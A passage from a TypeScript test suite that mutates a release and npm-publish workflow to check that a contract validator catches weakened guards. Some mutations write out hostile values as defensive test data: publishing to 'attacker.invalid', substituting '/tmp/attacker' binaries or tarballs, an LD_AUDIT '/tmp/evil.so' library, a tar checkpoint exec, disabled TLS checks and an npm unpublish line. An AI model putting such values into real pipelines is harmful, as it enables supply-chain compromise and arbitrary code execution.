          "https://uploads.github.com/repos/",
          "https://api.uploads.github.com/repos/"
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(mcpbInputs.release, "group: release-publication", "group: release-$TAG")
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          MCPB_ACTIONS_ARTIFACT_DOWNLOAD,
          replaceExactly(MCPB_ACTIONS_ARTIFACT_DOWNLOAD, "application/vnd.github+json", "application/octet-stream")
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    for (const weakenedVisibilityPoll of [
      replaceExactly(
        mcpbInputs.release,
        MCPB_RELEASE_VISIBILITY_POLL,
        replaceExactly(MCPB_RELEASE_VISIBILITY_POLL, "12", "1")
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_RELEASE_VISIBILITY_POLL_WITH_REFRESH,
        `${MCPB_RELEASE_VISIBILITY_POLL}\n            RELEASE_PAGES=$(printf`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_RELEASE_VISIBILITY_DUPLICATE_GUARD,
        replaceExactly(MCPB_RELEASE_VISIBILITY_DUPLICATE_GUARD, "-gt 1", "-lt 0")
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_RELEASE_VISIBILITY_TIMEOUT_GUARD,
        replaceExactly(MCPB_RELEASE_VISIBILITY_TIMEOUT_GUARD, "exit 1", "true")
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_RELEASE_VISIBILITY_WAIT,
        replaceExactly(MCPB_RELEASE_VISIBILITY_WAIT, "sleep 5", "true")
      )
    ]) {
      expect(mcpbContractProblems({ ...mcpbInputs, release: weakenedVisibilityPoll })).toContain(
        "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
      );
    }
    const npmPrewriteRegistryGuard =
      "            if ! registry_read; then\n" +
      '              echo "::error::npm pre-write check requires one authoritative, bounded full-packument HTTP 200"\n' +
      "              exit 1\n" +
      "            fi";
    const npmPrewriteTagProof = `            assert_remote_tag_identity\n${npmPrewriteRegistryGuard}`;
    const npmFinalTagProof = '          assert_remote_tag_identity\n          if [ "$NPM_PUBLISH_ATTEMPTED" = "true" ]';
    expect(mutationMatchCount(mcpbInputs.release, RAW_NPM_RESERVE_DEADLINE_GUARD)).toBe(RELEASE_RESERVE_GUARD_COUNT);
    for (const weakenedNpmTransaction of [
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PACK,
        replaceExactly(MCPB_EXACT_NPM_PACK, " --kill-after=10s", "")
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PACK,
        replaceExactly(MCPB_EXACT_NPM_PACK, " --ignore-scripts", "")
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PACK,
        `${MCPB_EXACT_NPM_PACK}\n          : ${MCPB_EXACT_NPM_PACK}`
      ),
      replaceExactly(mcpbInputs.release, '[ "$PACK_MANIFEST_COUNT" -ne 1 ]', "false"),
      replaceExactly(
        mcpbInputs.release,
        '$0 == "package/package.json" { count++ }',
        '$0 == "package/other.json" { count++ }'
      ),
      replaceExactly(mcpbInputs.release, '[ "$REPORTED_INTEGRITY" != "$EXPECTED_INTEGRITY" ]', "false"),
      replaceExactly(mcpbInputs.release, '[ "$PRE_PUBLISH_INTEGRITY" != "$EXPECTED_INTEGRITY" ]', "false"),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        replaceExactly(MCPB_EXACT_NPM_PUBLISH, '"$PACKAGE_TARBALL"', '"."')
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `${MCPB_EXACT_NPM_PUBLISH}\n${MCPB_EXACT_NPM_PUBLISH}`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `              PACKAGE_TARBALL="/tmp/attacker.tgz"\n${MCPB_EXACT_NPM_PUBLISH}`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `              NPM_BIN="/tmp/attacker"\n${MCPB_EXACT_NPM_PUBLISH}`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `              NPM_ENV_UNSETS=( )\n${MCPB_EXACT_NPM_PUBLISH}`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        replaceExactly(MCPB_EXACT_NPM_PUBLISH, " --kill-after=10s", "")
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        replaceExactly(MCPB_EXACT_NPM_PUBLISH, " --ignore-scripts", "")
      ),
      replaceExactly(mcpbInputs.release, "--strict-ssl=true", "--strict-ssl=false"),
      replaceExactly(
        mcpbInputs.release,
        "npm_config_proxy|npm_config_https_proxy",
        "npm_config_proxy|npm_config_wrong_proxy"
      ),
      replaceExactly(
        mcpbInputs.release,
        `NPM_ENV_KEY_CANONICAL=\${NPM_ENV_KEY_CANONICAL//-/_}`,
        `NPM_ENV_KEY_CANONICAL=\${NPM_ENV_KEY_CANONICAL//_/-}`
      ),
      replaceExactly(
        mcpbInputs.release,
        '            case "$NPM_ENV_KEY_CANONICAL" in',
        '            NPM_ENV_KEY_CANONICAL=other\n            case "$NPM_ENV_KEY_CANONICAL" in'
      ),
      replaceExactly(mcpbInputs.release, 'NPM_CONFIG_STRICT_SSL: "true"', 'NPM_CONFIG_STRICT_SSL: "false"'),
      replaceExactly(mcpbInputs.release, 'NPM_CONFIG_FETCH_RETRIES: "0"', 'NPM_CONFIG_FETCH_RETRIES: "1"'),
      replaceExactly(mcpbInputs.release, "--max-filesize 67108864 --retry 0", "--max-filesize 67108864 --retry 1"),
      replaceExactly(mcpbInputs.release, '[ "$status" != "200" ]', '[ "$status" = "500" ]'),
      replaceExactly(
        mcpbInputs.release,
        '--header "Accept: application/json" --header "Cache-Control: no-cache"',
        '--header "Accept: application/vnd.npm.install-v1+json" --header "Cache-Control: no-cache"'
      ),
      replaceExactly(mcpbInputs.release, "(.versions | has($version))", "(.versions[$version] != null)"),
      replaceExactly(mcpbInputs.release, '($channelPresent and ($channelVersion == "-"))', "false"),
      replaceExactly(mcpbInputs.release, "integrity: $published.dist.integrity", "integrity: $published.dist.shasum"),
      replaceExactly(
        mcpbInputs.release,
        RAW_NPM_RESERVE_DEADLINE_GUARD,
        MUTATED_RAW_NPM_RESERVE_DEADLINE_GUARD,
        RELEASE_RESERVE_GUARD_COUNT
      ),
      replaceAllExactly(
        mcpbInputs.release,
        'if ! now=$(/bin/date +%s) || ! [[ "$now" =~ ^[1-9][0-9]*$ ]]; then',
        "if now=$(/bin/date +%s); then",
        GH_READ_GUARD_COUNT + RELEASE_RESERVE_GUARD_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        'NPM_CONFIG_USERCONFIG=$(/usr/bin/mktemp "$RUNNER_TEMP/enquire-npmrc.XXXXXX")',
        'NPM_CONFIG_USERCONFIG="$GITHUB_WORKSPACE/.npmrc"'
      ),
      replaceExactly(
        mcpbInputs.release,
        '              cd "$NPM_PUBLISH_CWD" || exit 125',
        '              cd "$GITHUB_WORKSPACE"'
      ),
      replaceExactly(
        mcpbInputs.release,
        "                --@oomkapwn:registry=https://registry.npmjs.org/ \\",
        "                --@oomkapwn:registry=https://attacker.invalid/ \\"
      ),
      replaceExactly(mcpbInputs.release, 'require_job_reserve 4500 "npm publish"', "true"),
      replaceExactly(mcpbInputs.release, "              sleep 10", "              sleep 200"),
      replaceAllExactly(
        mcpbInputs.release,
        "            local limit=20",
        "            local limit=200",
        GH_READ_GUARD_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        '            require_job_reserve 4500 "npm publish"\n            assert_remote_tag_identity',
        '            assert_remote_tag_identity\n            require_job_reserve 4500 "npm publish"'
      ),
      replaceExactly(mcpbInputs.release, npmPrewriteTagProof, npmPrewriteRegistryGuard),
      replaceExactly(mcpbInputs.release, npmPrewriteRegistryGuard, "            registry_read || true"),
      replaceExactly(mcpbInputs.release, npmFinalTagProof, '          if [ "$NPM_PUBLISH_ATTEMPTED" = "true" ]'),
      replaceExactly(
        replaceExactly(mcpbInputs.release, npmFinalTagProof, '          if [ "$NPM_PUBLISH_ATTEMPTED" = "true" ]'),
        "          for (( attempt=1; attempt<=12; attempt++ )); do",
        "          assert_remote_tag_identity\n          for (( attempt=1; attempt<=12; attempt++ )); do"
      ),
      replaceExactly(
        mcpbInputs.release,
        "for (( attempt=1; attempt<=12; attempt++ )); do",
        "for (( attempt=1; attempt<=1; attempt++ )); do"
      ),
      replaceExactly(mcpbInputs.release, "NPM_PUBLISH_EXIT=$?", "NPM_PUBLISH_EXIT=0"),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `${MCPB_EXACT_NPM_PUBLISH}\n            "$NPM_BIN" publish "$PACKAGE_TARBALL" --tag "$CHANNEL"`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `${MCPB_EXACT_NPM_PUBLISH}\n            command npm publish "$RUNNER_TEMP/other.tgz" --tag "$CHANNEL"`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `${MCPB_EXACT_NPM_PUBLISH}\n            command npm pack --json --ignore-scripts`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `${MCPB_EXACT_NPM_PUBLISH}\n            npm dist-tag rm "$PACKAGE_NAME" "$CHANNEL"`
      ),
      replaceExactly(
        mcpbInputs.release,
        MCPB_EXACT_NPM_PUBLISH,
        `${MCPB_EXACT_NPM_PUBLISH}\n            npm unpublish "$PACKAGE_NAME@$VERSION"`
      )
    ]) {
      expect(mcpbContractProblems({ ...mcpbInputs, release: weakenedNpmTransaction })).toContain(
        "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
      );
    }
    for (const weakenedNpmEvaluator of [
      replaceExactly(mcpbInputs.integrity, "state.integrity !== expectedIntegrity", "false"),
      replaceAllExactly(mcpbInputs.integrity, 'Object.hasOwn(state, "gitHead")', "false", 2),
      replaceExactly(
        mcpbInputs.integrity,
        'decoded.toString("base64") === encoded',
        'decoded.toString("base64") !== encoded'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "expected npm tarball integrity must be one canonical SHA-512 SRI",
        "expected npm tarball integrity is optional"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "expected npm source SHA must be one exact lowercase SHA-1",
        "expected npm source SHA is optional"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "evaluateNpmPublication(payload, first, second, process.argv[5], process.argv[6])",
        "evaluateNpmPublication(payload, first, process.argv[5], second, process.argv[6])"
      )
    ]) {
      expect(mcpbContractProblems({ ...mcpbInputs, integrity: weakenedNpmEvaluator })).toContain(
        "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
      );
    }
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          'npm-state "$SOURCE_SHA" "$EXPECTED_INTEGRITY" "$VERSION" "$CHANNEL"',
          'npm-state "$PUBLISHED_SHA" "$EXPECTED_INTEGRITY" "$VERSION" "$CHANNEL"',
          3
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    const createWrite = `"$TIMEOUT_BIN" --kill-after=10s 300s "$GH_BIN" "\${CREATE_ARGS[@]}"`;
    const uploadWrite = "--fail-with-body --silent --show-error --request POST --retry 0";
    const uploadCurl = `"$CURL_BIN" --disable \\\n                --fail-with-body --silent --show-error --request POST --retry 0`;
    const patchWrite = '"$GH_BIN" api --method PATCH';
    const createTarget = `release create "$TAG" --repo "\${{ github.repository }}"`;
    const uploadTarget = '"$UPLOAD_BASE?name=$ENCODED_NAME")';
    const patchTarget = `"repos/\${{ github.repository }}/releases/$RELEASE_ID" "\${PUBLISH_FIELDS[@]}")`;
    const releaseProjection = "[.[] | {id, name, state, content_type, size, digest}] | sort_by(.name)";
    const releaseTransactionTail =
      '                echo "::error::Published stable release $TAG did not become GitHub\'s latest release"\n' +
      "                exit 1\n" +
      "              fi\n" +
      "              sleep 5\n" +
      "            done\n" +
      "          fi\n" +
      "          assert_remote_tag_identity";
    const rawCreateChannel =
      `          if [ "\${{ steps.dist_tag.outputs.tag }}" != "latest" ]; then\n` +
      "            CREATE_ARGS+=(--prerelease)\n" +
      "          fi";
    const uploadConfirmationMutations = [
      replaceExactly(
        mcpbInputs.release,
        'CONFIRM_ACTION" != "resume_draft" ] || [ "$CONFIRM_NAME_COUNT" -ne 0',
        'CONFIRM_ACTION" != "resume_draft" ] && [ "$CONFIRM_NAME_COUNT" -ne 0'
      ),
      replaceExactly(mcpbInputs.release, 'CONFIRM_NAME_COUNT" -ne 0 ] ||', 'CONFIRM_NAME_COUNT" -ne 0 ] &&'),
      replaceExactly(
        mcpbInputs.release,
        'CONFIRM_ASSET_PROJECTION" != "$CONFIRM_LOCAL_SUBSET"',
        'CONFIRM_ASSET_PROJECTION" = "$CONFIRM_LOCAL_SUBSET"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `PREWRITE_STATE=$(jq -n --argjson release "$CURRENT_RELEASE" --argjson assets "$CURRENT_ASSETS"`,
        `PREWRITE_STATE=$(jq -n --argjson release "$CURRENT_RELEASE" --argjson assets "$CONFIRM_ASSETS"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `PREWRITE_ACTION=$(printf '%s' "$PREWRITE_STATE" | release_state | jq -r '.action')`,
        `PREWRITE_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')`
      ),
      replaceExactly(
        mcpbInputs.release,
        `PREWRITE_NAME_COUNT=$(printf '%s' "$CURRENT_ASSETS" | jq --arg name "$NAME"`,
        `PREWRITE_NAME_COUNT=$(printf '%s' "$CONFIRM_ASSETS" | jq --arg name "$NAME"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `PREWRITE_ASSET_PROJECTION=$(printf '%s' "$CURRENT_ASSETS" | jq -cS`,
        `PREWRITE_ASSET_PROJECTION=$(printf '%s' "$CONFIRM_ASSETS" | jq -cS`
      ),
      replaceExactly(mcpbInputs.release, '--argjson remote "$CURRENT_ASSETS"', '--argjson remote "$CONFIRM_ASSETS"'),
      replaceExactly(
        mcpbInputs.release,
        'PREWRITE_ASSET_PROJECTION" != "$PREWRITE_LOCAL_SUBSET"',
        'PREWRITE_ASSET_PROJECTION" = "$PREWRITE_LOCAL_SUBSET"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE" --argjson assets "$CONFIRM_ASSETS"`,
        `CONFIRM_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE" --argjson assets "$CURRENT_ASSETS"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')`,
        `CONFIRM_ACTION=$(printf '%s' "$PREWRITE_STATE" | release_state | jq -r '.action')`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_NAME_COUNT=$(printf '%s' "$CONFIRM_ASSETS" | jq --arg name "$NAME"`,
        `CONFIRM_NAME_COUNT=$(printf '%s' "$CURRENT_ASSETS" | jq --arg name "$NAME"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_ASSET_PROJECTION=$(printf '%s' "$CONFIRM_ASSETS" | jq -cS`,
        `CONFIRM_ASSET_PROJECTION=$(printf '%s' "$CURRENT_ASSETS" | jq -cS`
      ),
      replaceExactly(mcpbInputs.release, '--argjson remote "$CONFIRM_ASSETS"', '--argjson remote "$CURRENT_ASSETS"'),
      replaceExactly(
        mcpbInputs.release,
        "[$local[] | . as $candidate | select(any($remote[]; .name == $candidate.name))] | sort_by(.name)",
        "[$remote[]] | sort_by(.name)",
        2
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')`,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')\n              CONFIRM_ACTION="resume_draft"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')`,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')\n              export CONFIRM_ACTION="resume_draft"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')`,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')\n              printf -v CONFIRM_ACTION '%s' "resume_draft"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')`,
        `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')\n              read -r CONFIRM_ACTION <<< "resume_draft"`
      ),
      replaceExactly(
        mcpbInputs.release,
        'if ! confirm_exact_draft_identity "Immediate pre-upload confirmation for $NAME"; then\n' +
          "                exit 1\n" +
          "              fi\n" +
          `              CONFIRM_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE" --argjson assets "$CONFIRM_ASSETS"`,
        'if ! confirm_exact_draft_identity "Immediate pre-upload confirmation for $NAME"; then\n' +
          "                exit 1\n" +
          "              fi\n" +
          "              CONFIRM_ASSETS=$CURRENT_ASSETS\n" +
          `              CONFIRM_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE" --argjson assets "$CONFIRM_ASSETS"`
      )
    ];
    const publicationBoundaryMutations = [
      replaceExactly(
        mcpbInputs.release,
        'CONFIRM_PUBLISH_ACTION" != "publish_draft" ] ||',
        'CONFIRM_PUBLISH_ACTION" = "publish_draft" ] ||'
      ),
      replaceExactly(
        mcpbInputs.release,
        'CONFIRM_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY"',
        'CONFIRM_ASSET_IDENTITY" = "$FINAL_ASSET_IDENTITY"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `PUBLISH_ASSET_IDENTITY=$(printf '%s' "$PUBLISH_ASSETS" | jq -cS`,
        `PUBLISH_ASSET_IDENTITY=$(printf '%s' "$FINAL_ASSETS" | jq -cS`
      ),
      replaceExactly(
        mcpbInputs.release,
        `IMMEDIATE_ASSET_IDENTITY=$(printf '%s' "$CURRENT_ASSETS" | jq -cS`,
        `IMMEDIATE_ASSET_IDENTITY=$(printf '%s' "$FINAL_ASSETS" | jq -cS`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_ASSET_IDENTITY=$(printf '%s' "$CONFIRM_ASSETS" | jq -cS`,
        `CONFIRM_ASSET_IDENTITY=$(printf '%s' "$FINAL_ASSETS" | jq -cS`
      ),
      replaceExactly(
        mcpbInputs.release,
        'IMMEDIATE_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY"',
        'IMMEDIATE_ASSET_IDENTITY" = "$FINAL_ASSET_IDENTITY"'
      ),
      replaceExactly(
        mcpbInputs.release,
        'PUBLISH_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY"',
        'PUBLISH_ASSET_IDENTITY" = "$FINAL_ASSET_IDENTITY"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `FINAL_ASSET_IDENTITY=$(printf '%s' "$FINAL_ASSETS" | jq -cS`,
        `FINAL_ASSET_IDENTITY=$(printf '%s' "$PUBLISH_ASSETS" | jq -cS`
      ),
      replaceExactly(mcpbInputs.release, "PUBLISH_RELEASE=$CURRENT_RELEASE", "PUBLISH_RELEASE=$FINAL_RELEASE"),
      replaceExactly(mcpbInputs.release, "PUBLISH_ASSETS=$CURRENT_ASSETS", "PUBLISH_ASSETS=$FINAL_ASSETS"),
      replaceExactly(
        mcpbInputs.release,
        `PUBLISH_STATE=$(jq -n --argjson release "$PUBLISH_RELEASE" --argjson assets "$PUBLISH_ASSETS"`,
        `PUBLISH_STATE=$(jq -n --argjson release "$PUBLISH_RELEASE" --argjson assets "$FINAL_ASSETS"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `FINAL_ACTION=$(printf '%s' "$PUBLISH_STATE" | release_state | jq -r '.action')`,
        `FINAL_ACTION=$(printf '%s' "$FINAL_STATE" | release_state | jq -r '.action')`
      ),
      replaceExactly(
        mcpbInputs.release,
        `IMMEDIATE_PUBLISH_STATE=$(jq -n --argjson release "$CURRENT_RELEASE"`,
        `IMMEDIATE_PUBLISH_STATE=$(jq -n --argjson release "$PUBLISH_RELEASE"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `--argjson assets "$CURRENT_ASSETS" '{release: $release, assets: $assets}')`,
        `--argjson assets "$FINAL_ASSETS" '{release: $release, assets: $assets}')`
      ),
      replaceExactly(
        mcpbInputs.release,
        `FINAL_ACTION=$(printf '%s' "$IMMEDIATE_PUBLISH_STATE" | release_state | jq -r '.action')`,
        `FINAL_ACTION=$(printf '%s' "$PUBLISH_STATE" | release_state | jq -r '.action')`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_PUBLISH_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE"`,
        `CONFIRM_PUBLISH_STATE=$(jq -n --argjson release "$CURRENT_RELEASE"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `--argjson assets "$CONFIRM_ASSETS" '{release: $release, assets: $assets}')`,
        `--argjson assets "$CURRENT_ASSETS" '{release: $release, assets: $assets}')`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_PUBLISH_ACTION=$(printf '%s' "$CONFIRM_PUBLISH_STATE" | release_state | jq -r '.action')`,
        `CONFIRM_PUBLISH_ACTION=$(printf '%s' "$IMMEDIATE_PUBLISH_STATE" | release_state | jq -r '.action')`
      ),
      replaceExactly(
        mcpbInputs.release,
        `PUBLISH_ASSET_IDENTITY=$(printf '%s' "$PUBLISH_ASSETS" | jq -cS`,
        `PUBLISH_ASSET_IDENTITY=$(printf '%s' "$PUBLISH_ASSETS" | jq -cS\n          PUBLISH_ASSET_IDENTITY="$FINAL_ASSET_IDENTITY"`
      ),
      replaceExactly(
        mcpbInputs.release,
        `CONFIRM_PUBLISH_ACTION=$(printf '%s' "$CONFIRM_PUBLISH_STATE" | release_state | jq -r '.action')`,
        `CONFIRM_PUBLISH_ACTION=$(printf '%s' "$CONFIRM_PUBLISH_STATE" | release_state | jq -r '.action')\n              export CONFIRM_PUBLISH_ACTION="publish_draft"`
      ),
      replaceExactly(
        mcpbInputs.release,
        'if ! confirm_exact_draft_identity "Immediate pre-publication draft confirmation"; then\n' +
          "                exit 1\n" +
          "              fi\n" +
          `              CONFIRM_PUBLISH_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE"`,
        'if ! confirm_exact_draft_identity "Immediate pre-publication draft confirmation"; then\n' +
          "                exit 1\n" +
          "              fi\n" +
          "              CONFIRM_ASSETS=$CURRENT_ASSETS\n" +
          `              CONFIRM_PUBLISH_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE"`
      ),
      replaceExactly(
        mcpbInputs.release,
        'if [ "$FINAL_ACTION" = "publish_draft" ]; then',
        'if [ "$FINAL_ACTION" != "publish_draft" ]; then',
        2
      )
    ];
    const snapshotShapeMutations = [
      replaceAllExactly(
        mcpbInputs.release,
        "'{release: $release, assets: $assets}')",
        "'{release: $assets, assets: $release}')",
        15
      ),
      replaceAllExactly(
        mcpbInputs.release,
        "[.[] | {name, content_type, size, digest}] | sort_by(.name)",
        "[.[] | {name, content_type, digest}] | sort_by(.name)",
        3
      ),
      replaceAllExactly(
        mcpbInputs.release,
        "'{release: $release, assets: $assets}')",
        "'{release: $assets, assets: $release}') # '{release: $release, assets: $assets}')",
        15
      ),
      replaceAllExactly(
        mcpbInputs.release,
        "'[.[] | {name, content_type, size, digest}] | sort_by(.name)')",
        "'[.[] | {name, content_type, digest}] | sort_by(.name)') # [.[] | {name, content_type, size, digest}] | sort_by(.name)",
        3
      )
    ];
    const releaseTransactionMutations = [
      ...uploadConfirmationMutations,
      ...publicationBoundaryMutations,
      ...snapshotShapeMutations,
      replaceExactly(
        mcpbInputs.release,
        `          ${LOWERCASE_PROXY_UNSET}\n`,
        "          builtin true # lowercase proxy cleanup removed\n",
        RELEASE_FIXTURE_PROXY_UNSET_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        '          npm_config_registry="$NPM_CONFIG_REGISTRY"',
        '          npm_config_registry="https://attacker.invalid/"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `          RELEASE_TRANSACTION_SHA256="${releaseTransactionSha256}"`,
        `          RELEASE_TRANSACTION_SHA256="${"0".repeat(64)}"`
      ),
      replaceExactly(
        mcpbInputs.release,
        "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
        '            /bin/bash --noprofile --norc -p -e -o pipefail "$RELEASE_TRANSACTION_PATH"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `          MCPB_RELEASE_WORKFLOW_SHA: \${{ github.workflow_sha }}`,
        `          MCPB_RELEASE_WORKFLOW_SHA: \${{ github.sha }}`
      ),
      replaceExactly(
        mcpbInputs.release,
        "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
        "            /bin/bash --noprofile --norc -p -e -o pipefail -s --\n          echo unsafe-wrapper-tail"
      ),
      replaceExactly(
        mcpbInputs.release,
        "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
          "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
        "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
          "            /bin/bash --noprofile --norc -p -e -o pipefail -s --\n" +
          "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
          "            /bin/bash --noprofile --norc -p -e -o pipefail -s --"
      ),
      replaceAllExactly(
        mcpbInputs.release,
        "shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}",
        "shell: /bin/bash --noprofile --norc -e -o pipefail {0}",
        RELEASE_HARDENED_SHELL_COUNT
      ),
      replaceAllExactly(
        mcpbInputs.release,
        'GH_CONFIG_DIR=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-gh-config.XXXXXX")',
        'GH_CONFIG_DIR="$RUNNER_TEMP"',
        RELEASE_FIXTURE_GH_CONFIG_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        '          SHELLOPTS: ""',
        '          SHELLOPTS: "xtrace"',
        RELEASE_HARDENED_ENV_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        '          LD_AUDIT: ""',
        '          LD_AUDIT: "/tmp/evil.so"',
        RELEASE_HARDENED_ENV_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        '          TAR_OPTIONS: ""',
        '          TAR_OPTIONS: "--checkpoint=1 --checkpoint-action=exec=/tmp/evil"',
        RELEASE_HARDENED_ENV_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        '          GODEBUG: ""',
        '          GODEBUG: "http2debug=2"',
        RELEASE_HARDENED_ENV_COUNT
      ),
      replaceExactly(
        mcpbInputs.release,
        '          NODE_TLS_REJECT_UNAUTHORIZED: "1"',
        '          NODE_TLS_REJECT_UNAUTHORIZED: "0"',
        RELEASE_TLS_PIN_COUNT
      ),
      replaceExactly(mcpbInputs.release, "          persist-credentials: false", "          persist-credentials: true"),
      replaceExactly(
        mcpbInputs.release,
        `          ref: \${{ github.event.inputs.tag || github.ref }}`,
        `          ref: \${{ github.workflow_sha }}`
      ),
      replaceExactly(mcpbInputs.release, "          fetch-depth: 0", "          fetch-depth: 1"),
      replaceExactly(
        mcpbInputs.release,
        "              GIT_NO_LAZY_FETCH=1 \\",
        "              GIT_NO_LAZY_FETCH=0 \\"
      ),
      replaceExactly(
        mcpbInputs.release,
        '              --git-dir="$GITHUB_WORKSPACE/.git" \\',
        '              --git-dir="$RUNNER_TEMP/attacker.git" \\'
      ),
      replaceExactly(
        mcpbInputs.release,
        `"repos/\${{ github.repository }}/releases/latest" 2>/dev/null)`,
        `"repos/\${{ github.repository }}/releases/latest" 2>&1)`,
        2
      ),
      replaceExactly(mcpbInputs.release, "select(length == 1) | .[0] |", ".[] |", RELEASE_SINGLETON_DECODER_COUNT),
      replaceExactly(mcpbInputs.release, "/usr/bin/jq -cse \\", "/usr/bin/jq -ce \\", 2),
      replaceExactly(mcpbInputs.release, "| /usr/bin/jq -se \\", "| /usr/bin/jq -e \\", 2),
      replaceExactly(mcpbInputs.release, '[ "$GITHUB_LATEST_EXIT" -ne 4 ]', '[ "$GITHUB_LATEST_EXIT" -ne 2 ]', 2),
      replaceExactly(
        mcpbInputs.release,
        '.message == "Not Found" and .status == "404" and',
        '(.message | type) == "string" and .status == "404" and',
        2
      ),
      replaceExactly(
        mcpbInputs.release,
        'EXPECTED_RELEASE_NAME="$TAG" EXPECTED_RELEASE_BODY="$NOTES"',
        'EXPECTED_RELEASE_NAME="$TAG" EXPECTED_RELEASE_BODY="$REMOTE_BODY"',
        3
      ),
      replaceExactly(
        mcpbInputs.release,
